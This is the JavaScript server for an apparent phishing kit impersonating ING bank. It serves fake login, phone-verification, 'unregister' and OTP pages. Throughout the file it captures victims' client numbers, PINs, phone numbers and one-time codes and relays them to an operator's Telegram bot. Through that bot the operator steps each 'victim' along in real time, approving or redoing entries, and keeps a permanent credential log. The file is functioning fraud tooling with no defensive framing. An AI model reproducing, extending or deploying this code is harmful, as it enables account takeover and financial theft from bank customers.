/* ==========  CONFIG  ========== */
const TOKEN   = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

/* =============================== */

const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

if (!TOKEN || !CHAT_ID) {
  console.error('ERROR: BOT_TOKEN and CHAT_ID environment variables required');
  process.exit(1);
}

// Use polling mode (more reliable for Railway)
const bot = new TelegramBot(TOKEN, { polling: true });

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Store admin panel state
let adminPanelMessageId = null;
let adminPanelChatId = null;
let currentView = 'main';
let selectedSessionId = null;
let isPhotoMessage = false;

/* ======  SESSION MANAGEMENT  ====== */
const sessions = new Map();
const sessionActivity = new Map();

// Session timeout: 3 minutes
const SESSION_TIMEOUT = 3 * 60 * 1000;

let victimCounter = 0;
let successfulLogins = 0;
let currentDomain = '';

/* ======  PERSISTENT AUDIT LOG  ====== */
const auditLog = [];               // never deleted

/* ======  MIDDLEWARE  ====== */
app.use((req, res, next) => {
  const host = req.headers.host || req.hostname;
  const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
  if (host && host !== 'localhost') {
    currentDomain = `${protocol}://${host}`;
  }
  next();
});

/* ======  STATIC ROUTES  ====== */
app.use(express.static(__dirname));

app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
app.get('/verify.html', (req, res) => res.sendFile(__dirname + '/verify.html'));
app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.html'));
app.get('/otp.html', (req, res) => res.sendFile(__dirname + '/otp.html'));
app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));

/* ======  UA PARSER  ====== */
function uaParser(ua) {
  const u = { browser: {}, os: {} };
  if (/Windows NT/.test(ua)) u.os.name = 'Windows';
  if (/Android/.test(ua)) u.os.name = 'Android';
  if (/iPhone|iPad/.test(ua)) u.os.name = 'iOS';
  if (/Linux/.test(ua) && !/Android/.test(ua)) u.os.name = 'Linux';
  if (/Chrome\/(\d+)/.test(ua)) u.browser.name = 'Chrome';
  if (/Firefox\/(\d+)/.test(ua)) u.browser.name = 'Firefox';
  if (/Safari\/(\d+)/.test(ua) && !/Chrome/.test(ua)) u.browser.name = 'Safari';
  if (/Edge\/(\d+)/.test(ua)) u.browser.name = 'Edge';
  return u;
}

/* ======  BUTTONS  ====== */
function tgOpts(sid) {
  const v = sessions.get(sid);

  if (v?.page === 'success') return noBtn();

  if (v?.page === 'verify.html') {
    return {
      reply_markup: {
        inline_keyboard: [[
          { text: '🔁 Redo', callback_data: `redo|${sid}` },
          { text: '✅ Continue', callback_data: `cont|${sid}` }
        ]]
      }
    };
  }

  if (v?.page === 'unregister.html' && !v?.unregisterClicked) {
    return { reply_markup: { inline_keyboard: [[]] } };
  }

  if (v?.page === 'index.html' || v?.page === 'otp.html') {
    return {
      reply_markup: {
        inline_keyboard: [[
          { text: '🔁 Redo', callback_data: `redo|${sid}` },
          { text: '✅ Continue', callback_data: `cont|${sid}` }
        ]]
      }
    };
  }

  return {
    reply_markup: {
      inline_keyboard: [[
        { text: '✅ Continue', callback_data: `cont|${sid}` }
      ]]
    }
  };
}

function noBtn() {
  return { reply_markup: { inline_keyboard: [[]] } };
}

/* ======  GET SESSION HEADER  ====== */
function getSessionHeader(v) {
  if (v.page === 'success') return `🦁 ING Login approved`;
  if (v.status === 'approved') return `🦁 ING Login approved`;
  if (v.page === 'index.html') {
    return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
  } else if (v.page === 'verify.html') {
    return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
  } else if (v.page === 'unregister.html') {
    return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
  } else if (v.page === 'otp.html') {
    if (v.otp && v.otp.length > 0) {
      return `✅ Received OTP`;
    }
    return `🔑 Awaiting OTP...`;
  }
  return `🔑 Awaiting OTP...`;
}

/* ======  BUILD MESSAGE  ====== */
function buildMsg(v, extra = '') {
  const geo = `https://ipgeolocation.io/ip-location/ ${v.ip}`;

  if (extra && extra.includes('ING Login approved')) {
    return `${extra}
Session ID: <code>${v.sid}</code>
Client number: <code>${v.entered ? v.email : '—'}</code>
PIN: <code>${v.entered ? v.password : '—'}</code>
Phone: <code>${v.phone || '—'}</code>
${v.otp ? `OTP: <code>${v.otp}</code>\n` : ''}\
${v.billing ? `Billing: <code>${v.billing}</code>\n` : ''}\
IP: <code>${v.ip}</code>  <a href="${geo}">Geo</a>
Platform: <code>${v.platform}</code>
Browser: <code>${v.browser}</code>
UA: <code>${v.ua || 'n/a'}</code>
Date: <code>${v.dateStr}</code>`;
  }

  let hdr = getSessionHeader(v);

  if (extra.startsWith('♻️')) hdr = extra;
  if (extra.startsWith('✅')) hdr = extra;
  if (extra.startsWith('🔑')) hdr = extra;
  if (extra.startsWith('🔒')) hdr = extra;
  if (extra.startsWith('🏦')) hdr = extra;
  if (extra.startsWith('➡️')) hdr = extra;
  if (extra.startsWith('🦁')) hdr = extra;

  return `${hdr}
Session ID: <code>${v.sid}</code>
Client number: <code>${v.entered ? v.email : '—'}</code>
PIN: <code>${v.entered ? v.password : '—'}</code>
Phone: <code>${v.phone || '—'}</code>
${v.otp ? `OTP: <code>${v.otp}</code>\n` : ''}\
${v.billing ? `Billing: <code>${v.billing}</code>\n` : ''}\
IP: <code>${v.ip}</code>  <a href="${geo}">Geo</a>
Platform: <code>${v.platform}</code>
Browser: <code>${v.browser}</code>
UA: <code>${v.ua || 'n/a'}</code>
Date: <code>${v.dateStr}</code>`;
}

/* ======  BUILD ADMIN PANEL  ====== */
function buildAdminPanel() {
  const activeSessions = Array.from(sessions.values());
  const activeCount = activeSessions.length;
  const waitingCount = activeSessions.filter(s => s.status === 'wait').length;

  let text = `🦁 *ING PANEL*

🌐 Current Domain: \`${currentDomain || 'Not set'}\`

📈 Statistics:
• Total Victims: ${victimCounter}
• Active Sessions: ${activeCount}
• Waiting for Action: ${waitingCount}
• Successful Logins: ${successfulLogins}`;

  const keyboard = [];

  if (currentView === 'main') {
    keyboard.push([{ text: '📋 Show Sessions', callback_data: 'view_sessions' }]);
    keyboard.push([{ text: '📜 View All Logs', callback_data: 'view_logs' }]);
    keyboard.push([{ text: '⚙️ Settings', callback_data: 'settings' }]);
    keyboard.push([{ text: '🔄 Refresh', callback_data: 'refresh_panel' }]);

  } else if (currentView === 'sessions') {
    text = `🎯 *Select a session to view:*\n`;

    if (activeCount === 0) {
      text += `\n_No active sessions_`;
    } else {
      activeSessions.forEach((s, idx) => {
        const status = s.status === 'wait' ? '⏳' : s.status === 'ok' ? '✅' : '🟢';
        const header = getSessionHeader(s);

        text += `\n${idx + 1}. ${status} Victim #${s.victimNum}\n   └ ${header}`;
      });

      const rows = [];
      for (let i = 0; i < activeSessions.length; i += 2) {
        const row = [];
        row.push({
          text: `#${activeSessions[i].victimNum}`,
          callback_data: `view_session|${activeSessions[i].sid}`
        });
        if (activeSessions[i + 1]) {
          row.push({
            text: `#${activeSessions[i + 1].victimNum}`,
            callback_data: `view_session|${activeSessions[i + 1].sid}`
          });
        }
        rows.push(row);
      }
      keyboard.push(...rows);
    }

    keyboard.push([{ text: '◀️ Back to Main', callback_data: 'back_main' }]);

  } else if (currentView === 'session_detail' && selectedSessionId) {
    const v = sessions.get(selectedSessionId);
    if (v) {
      const header = getSessionHeader(v);

      text = `🎯 *Victim #${v.victimNum}*
└ ${header}

📋 Session Info:
├ ID: \`${v.sid}\`
├ Client: \`${v.entered ? v.email : '---'}\`
├ PIN: \`${v.entered ? v.password : '---'}\`
├ OTP: \`${v.otp || '---'}\`
├ Phone: \`${v.phone || '---'}\`
IP: \`${v.ip}\`
├ Platform: \`${v.platform}\`
└ Browser: \`${v.browser}\``;

      if (v.page === 'index.html') {
        keyboard.push([
          { text: '🔁 Redo', callback_data: `redo|${v.sid}` },
          { text: '✅ Continue', callback_data: `cont|${v.sid}` }
        ]);
      } else if (v.page === 'verify.html') {
        keyboard.push([
          { text: '🔁 Redo', callback_data: `redo|${v.sid}` },
          { text: '✅ Continue', callback_data: `cont|${v.sid}` }
        ]);
      } else if (v.page === 'unregister.html') {
        if (v.unregisterClicked) {
          keyboard.push([{ text: '✅ Continue', callback_data: `cont|${v.sid}` }]);
        }
      } else if (v.page === 'otp.html' && v.otp && v.otp.length > 0) {
        keyboard.push([
          { text: '🔁 Redo', callback_data: `redo|${v.sid}` },
          { text: '✅ Continue', callback_data: `cont|${v.sid}` }
        ]);
      }

      keyboard.push([{ text: '◀️ Back to List', callback_data: 'back_sessions' }]);
    } else {
      text = `❌ *Session not found*`;
      keyboard.push([{ text: '◀️ Back to Sessions', callback_data: 'view_sessions' }]);
    }

  } else if (currentView === 'settings') {
    text = `⚙️ *Settings*\n\nSelect an action:`;

    if (activeCount > 0) {
      keyboard.push([{ text: '🗑 Delete Session', callback_data: 'delete_session_menu' }]);
    }

    keyboard.push([{ text: '◀️ Back to Main', callback_data: 'back_main' }]);
  } else if (currentView === 'delete_session_menu') {
    text = `🗑 *Delete Session*\n\nSelect session to delete:`;

    if (activeCount === 0) {
      text += `\n_No active sessions_`;
    } else {
      const rows = [];
      for (let i = 0; i < activeSessions.length; i += 2) {
        const row = [];
        row.push({
          text: `#${activeSessions[i].victimNum} 🗑`,
          callback_data: `confirm_delete|${activeSessions[i].sid}`
        });
        if (activeSessions[i + 1]) {
          row.push({
            text: `#${activeSessions[i + 1].victimNum} 🗑`,
            callback_data: `confirm_delete|${activeSessions[i + 1].sid}`
          });
        }
        rows.push(row);
      }
      keyboard.push(...rows);
    }

    keyboard.push([{ text: '◀️ Back to Settings', callback_data: 'settings' }]);
  }

  return { text, keyboard };
}

/* ======  UPDATE ADMIN PANEL  ====== */
async function updateAdminPanel() {
  if (!adminPanelMessageId || !adminPanelChatId) return;

  try {
    const { text, keyboard } = buildAdminPanel();

    if (currentView === 'main' && isPhotoMessage) {
      try {
        await bot.deleteMessage(adminPanelChatId, adminPanelMessageId);
      } catch (e) {}

      const headerPath = path.join(__dirname, 'header.jpg');
      if (fs.existsSync(headerPath)) {
        const panel = await bot.sendPhoto(adminPanelChatId, headerPath, {
          caption: text,
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: keyboard }
        });
        adminPanelMessageId = panel.message_id;
        isPhotoMessage = true;
      } else {
        const panel = await bot.sendMessage(adminPanelChatId, text, {
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: keyboard }
        });
        adminPanelMessageId = panel.message_id;
        isPhotoMessage = false;
      }
    } else if (isPhotoMessage) {
      await bot.editMessageCaption(text, {
        chat_id: adminPanelChatId,
        message_id: adminPanelMessageId,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard }
      });
    } else {
      await bot.editMessageText(text, {
        chat_id: adminPanelChatId,
        message_id: adminPanelMessageId,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard }
      });
    }
  } catch (err) {
    console.error('Panel update error:', err);
    if (err.response?.body?.description?.includes('message to edit not found')) {
      adminPanelMessageId = null;
      isPhotoMessage = false;
    }
  }
}

/* ======  CLEANUP SESSION  ====== */
async function cleanupSession(sid, reason, silent = false) {
  const v = sessions.get(sid);
  if (!v) return;

  if (!silent) {
    await bot.sendMessage(CHAT_ID, `👋 *Victim #${v.victimNum}* ${reason}`, {
      parse_mode: 'Markdown'
    }).catch(() => {});
  }

  sessions.delete(sid);
  sessionActivity.delete(sid);

  if (currentView === 'session_detail' && selectedSessionId === sid) {
    currentView = 'sessions';
    selectedSessionId = null;
  }

  await updateAdminPanel();
}

/* ======  SESSION TIMEOUT CHECKER  ====== */
setInterval(async () => {
  const now = Date.now();

  for (const [sid, lastActivity] of sessionActivity) {
    if (now - lastActivity > SESSION_TIMEOUT) {
      await cleanupSession(sid, 'timed out (3min idle)', true);
    }
  }
}, 10000);

/* ======  NEW SESSION  ====== */
app.post('/api/session', async (req, res) => {
  try {
    const sid = crypto.randomUUID();
    const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const ua  = req.headers['user-agent'] || 'n/a';
    const now = new Date();
    const dateStr = `${String(now.getDate()).padStart(2,'0')}/${String(now.getMonth()+1).padStart(2,'0')}/${String(now.getFullYear()).slice(-2)} ${now.toLocaleString('en-US',{hour:'numeric',minute:'2-digit',hour12:true})}`;

    victimCounter++;

    const victim = {
      sid, ip, ua, dateStr,
      entered: false,
      email: '',
      password: '',
      phone: '',
      otp: '',
      billing: '',
      page: 'index.html',
      platform: uaParser(ua).os?.name || 'n/a',
      browser: uaParser(ua).browser?.name || 'n/a',
      attempt: 0,
      totalAttempts: 0,
      otpAttempt: 0,
      unregisterClicked: false,
      status: 'loaded',
      victimNum: victimCounter
    };

    sessions.set(sid, victim);
    sessionActivity.set(sid, Date.now());

    await updateAdminPanel();
    res.json({ sid });
  } catch (err) {
    console.error('Session creation error', err);
    res.status(500).json({ error: 'Failed to create session' });
  }
});

/* ======  PING / HEARTBEAT  ====== */
app.post('/api/ping', (req, res) => {
  const { sid } = req.body;
  if (sid && sessions.has(sid)) {
    sessionActivity.set(sid, Date.now());
    res.sendStatus(200);
  } else {
    res.sendStatus(404);
  }
});

/* ======  LOGIN  ====== */
app.post('/api/login', async (req, res) => {
  try {
    const { sid, email, password } = req.body;
    if (!email?.trim() || !password?.trim()) return res.sendStatus(400);
    if (!sessions.has(sid)) return res.sendStatus(404);

    const v = sessions.get(sid);
    v.entered = true;
    v.email = email;
    v.password = password;
    v.status = 'wait';
    v.attempt += 1;
    v.totalAttempts += 1;
    sessionActivity.set(sid, Date.now());

    /* push to all-time log immediately */
    auditLog.push({
      t:        Date.now(),
      victimN:  v.victimNum,
      sid,
      email:    v.email,
      password: v.password,
      phone:    '',               // empty for now
      ip:       v.ip,
      ua:       v.ua
    });

    await updateAdminPanel();
    res.sendStatus(200);
  } catch (err) {
    console.error('Login error', err);
    res.status(500).send('Error');
  }
});

/* ======  PHONE-VERIFY  ====== */
app.post('/api/verify', async (req, res) => {
  try {
    const { sid, phone } = req.body;
    if (!phone?.trim()) return res.sendStatus(400);
    if (!sessions.has(sid)) return res.sendStatus(404);

    const v = sessions.get(sid);
    v.phone = phone;
    v.page  = 'verify.html';
    v.status= 'wait';
    sessionActivity.set(sid, Date.now());

    /* update existing audit-log entry with phone */
    const entry = auditLog.find(e => e.sid === sid);
    if (entry) entry.phone = phone;

    await updateAdminPanel();
    res.sendStatus(200);
  } catch (e) {
    console.error('Verify error', e);
    res.sendStatus(500);
  }
});

/* ======  UNREGISTER  ====== */
app.post('/api/unregister', async (req, res) => {
  try {
    const { sid } = req.body;
    if (!sessions.has(sid)) return res.sendStatus(404);

    const v = sessions.get(sid);
    v.unregisterClicked = true;
    v.status = 'wait';
    sessionActivity.set(sid, Date.now());

    await updateAdminPanel();
    res.sendStatus(200);
  } catch (err) {
    console.error('Unregister error', err);
    res.sendStatus(500);
  }
});

/* ======  OTP  ====== */
app.post('/api/otp', async (req, res) => {
  try {
    const { sid, otp } = req.body;
    if (!otp?.trim()) return res.sendStatus(400);
    if (!sessions.has(sid)) return res.sendStatus(404);
    const v = sessions.get(sid);

    v.otp = otp;
    v.status = 'wait';
    sessionActivity.set(sid, Date.now());

    /* update existing audit-log entry with OTP */
    const entry = auditLog.find(e => e.sid === sid);
    if (entry) entry.otp = otp;

    await updateAdminPanel();
    res.sendStatus(200);
  } catch (err) {
    console.error('OTP error', err);
    res.status(500).send('Error');
  }
});

/* ======  EXIT (PAGE CLOSE)  ====== */
app.post('/api/exit', async (req, res) => {
  const { sid } = req.body;
  if (sid && sessions.has(sid)) {
    await cleanupSession(sid, 'closed the page', true);
  }
  res.sendStatus(200);
});

/* ======  STATUS  ====== */
app.get('/api/status/:sid', (req, res) => {
  const v = sessions.get(req.params.sid);
  if (!v) return res.json({ status: 'gone' });
  res.json({ status: v.status });
});

app.post('/api/clearRedo', (req, res) => {
  const v = sessions.get(req.body.sid);
  if (v && v.status === 'redo') v.status = 'loaded';
  res.sendStatus(200);
});

app.post('/api/clearOk', (req, res) => {
  const v = sessions.get(req.body.sid);
  if (v && v.status === 'ok') v.status = 'loaded';
  res.sendStatus(200);
});

/* ======  TELEGRAM COMMANDS  ====== */
bot.onText(/\/start/, async (msg) => {
  if (msg.chat.id.toString() !== CHAT_ID.toString()) return;

  currentView = 'main';
  selectedSessionId = null;

  if (adminPanelMessageId) {
    try {
      await bot.deleteMessage(adminPanelChatId, adminPanelMessageId);
    } catch (e) {}
  }

  const { text, keyboard } = buildAdminPanel();

  const headerPath = path.join(__dirname, 'header.jpg');
  try {
    if (fs.existsSync(headerPath)) {
      const panel = await bot.sendPhoto(msg.chat.id, headerPath, {
        caption: text,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard }
      });
      adminPanelMessageId = panel.message_id;
      adminPanelChatId = msg.chat.id;
      isPhotoMessage = true;
    } else {
      const panel = await bot.sendMessage(msg.chat.id, text, {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard }
      });
      adminPanelMessageId = panel.message_id;
      adminPanelChatId = msg.chat.id;
      isPhotoMessage = false;
    }
  } catch (err) {
    const panel = await bot.sendMessage(msg.chat.id, text, {
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: keyboard }
    });
    adminPanelMessageId = panel.message_id;
    adminPanelChatId = msg.chat.id;
    isPhotoMessage = false;
  }
});

/* ======  CALLBACK HANDLER  ====== */
bot.on('callback_query', async (q) => {
  try {
    const data = q.data;

    if (data === 'back_main') {
      currentView = 'main';
      selectedSessionId = null;
      await updateAdminPanel();
      return bot.answerCallbackQuery(q.id, 'Back to main menu');
    }

    if (data === 'back_sessions') {
      currentView = 'sessions';
      selectedSessionId = null;
      await updateAdminPanel();
      return bot.answerCallbackQuery(q.id, 'Back to sessions list');
    }

    if (data === 'view_sessions') {
      currentView = 'sessions';
      selectedSessionId = null;
      await updateAdminPanel();
      return bot.answerCallbackQuery(q.id, 'Showing all sessions');
    }

    if (data === 'refresh_panel') {
      await updateAdminPanel();
      return bot.answerCallbackQuery(q.id, 'Panel refreshed');
    }

    if (data === 'settings') {
      currentView = 'settings';
      selectedSessionId = null;
      await updateAdminPanel();
      return bot.answerCallbackQuery(q.id, 'Settings opened');
    }

    if (data === 'delete_session_menu') {
      currentView = 'delete_session_menu';
      await updateAdminPanel();
      return bot.answerCallbackQuery(q.id, 'Select session to delete');
    }

    if (data.startsWith('view_session|')) {
      const sid = data.split('|')[1];
      if (sessions.has(sid)) {
        currentView = 'session_detail';
        selectedSessionId = sid;
        await updateAdminPanel();
        return bot.answerCallbackQuery(q.id, 'Session details');
      } else {
        return bot.answerCallbackQuery(q.id, 'Session not found');
      }
    }

    if (data.startsWith('confirm_delete|')) {
      const sid = data.split('|')[1];
      if (sessions.has(sid)) {
        const v = sessions.get(sid);
        await cleanupSession(sid, 'deleted by admin', true);
        return bot.answerCallbackQuery(q.id, `Deleted Victim #${v.victimNum}`);
      } else {
        return bot.answerCallbackQuery(q.id, 'Session not found');
      }
    }

    /* ----- new callback: view all logs ----- */
    if (data === 'view_logs') {
      if (auditLog.length === 0) {
        await bot.answerCallbackQuery(q.id, 'No logs yet');
        return;
      }
      const lines = auditLog.slice(-50).reverse().map((e, i) =>
        `${i + 1}. Victim #${e.victimN}  <code>${e.email || '-'}</code>  <code>${e.password || '-'}</code>  <code>${e.phone || '-'}</code>  ${new Date(e.t).toLocaleString('en-AU')}`
      );
      const msg = '📜 <b>All-Time Credential Log</b> ( newest first )\n\n' + lines.join('\n');
      await bot.sendMessage(CHAT_ID, msg, { parse_mode: 'HTML' });
      return bot.answerCallbackQuery(q.id, 'Sent log');
    }

    const [action, sid] = data.split('|');
    if (!sessions.has(sid)) {
      return bot.answerCallbackQuery(q.id, 'Session expired');
    }

    const v = sessions.get(sid);

    if (action === 'redo') {
      if (v.page === 'index.html') {
        v.status = 'redo';
        v.entered = false;
        v.email = '';
        v.password = '';
        v.otp = '';
        v.billing = '';
        await updateAdminPanel();
        return bot.answerCallbackQuery(q.id, 'Login page will refresh');
      }

      if (v.page === 'verify.html') {
        v.status = 'redo';
        v.phone = '';
        await updateAdminPanel();
        return bot.answerCallbackQuery(q.id, 'Verify page will refresh');
      }

      if (v.page === 'otp.html') {
        v.status = 'redo';
        v.otp = '';
        v.otpAttempt += 1;
        await updateAdminPanel();
        return bot.answerCallbackQuery(q.id, 'OTP page will refresh');
      }
    }

    if (action === 'cont') {
      // Set status to 'ok' for victim to detect
      v.status = 'ok';

      if (v.page === 'index.html') {
        v.page = 'verify.html';
        await updateAdminPanel();
        return bot.answerCallbackQuery(q.id, 'Proceeding to verify phone');
      } else if (v.page === 'verify.html') {
        v.page = 'unregister.html';
        await updateAdminPanel();
        return bot.answerCallbackQuery(q.id, 'Proceeding to unregister');
      } else if (v.page === 'unregister.html') {
        v.page = 'otp.html';
        await updateAdminPanel();
        return bot.answerCallbackQuery(q.id, 'Proceeding to OTP');
      } else if (v.page === 'otp.html') {
        v.page = 'success';
        successfulLogins++;
        await updateAdminPanel();
        return bot.answerCallbackQuery(q.id, 'Login approved - redirecting to ING');
      }
    }
  } catch (err) {
    console.error('Callback error', err);
    bot.answerCallbackQuery(q.id, 'Error processing action');
  }
});

/* ==========  START  ========== */
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RAILWAY_PUBLIC_DOMAIN || `http://localhost:${PORT}`;
});
